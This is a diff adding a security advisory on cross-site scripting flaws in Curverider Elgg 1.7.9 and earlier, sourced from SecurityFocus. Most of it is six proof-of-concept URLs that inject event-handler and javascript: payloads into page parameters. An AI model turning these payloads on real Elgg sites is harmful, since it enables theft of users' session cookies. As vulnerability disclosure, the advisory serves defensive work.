@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/48946/info
+
+Curverider Elgg is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Curverider Elgg versions 1.7.9 and prior are vulnerable.
+
+http://www.example.com/elgg/mod/file/search.php?subtype=file&page_owner=%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22%20onmouseover%3d%22alert%28/XSS/%29%22%20x=%22f
+http://www.example.com/elgg/mod/riverdashboard/?content=%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22%20onmouseover%3d%22alert%28/XSS/%29%22%20x=%22f&callback=true
+http://www.example.com/elgg/pg/embed/upload?internalname=%22%20onmouseover%3d%22alert%28%27XSS%27%29%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22
+http://www.example.com/elgg/pg/pages/edit/%22%20onmouseover%3d%22alert%28%27XSS%27%29%22%20style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22
+http://www.example.com/elgg/pg/pages/new/?container_guid=%22%20style%3d%22background-image%3aurl%28javascript:alert%28/XSS/%29%29%22%20x=%22
+http://www.example.com/elgg/pg/pages/new/?container_guid=%22%20style%3d%22background-image%3aurl%28javascript:alert%28/XSS/%29%29%22%20x=%22
+
